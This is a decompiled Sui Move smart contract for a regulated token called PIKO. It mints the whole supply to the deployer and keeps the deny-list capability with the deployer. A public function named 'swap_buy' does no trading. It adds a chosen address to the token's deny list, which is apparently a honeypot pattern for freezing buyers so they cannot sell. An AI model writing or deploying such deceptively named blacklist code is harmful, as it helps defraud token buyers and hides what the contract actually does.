module 0x7ae3ee4e86ea6bd15e1226e9797ae1b35adadfa0cff2b0d61e1365bdfe36e1a5::piko {
    struct PIKO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PIKO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PIKO>(arg0, 9, b"PIKO", b"PIKO", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmStziGqJVVDMDANu1pg1rQ9ECQ1ocuVBXhJevxbt9qqep"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PIKO>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PIKO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PIKO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PIKO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PIKO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PIKO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

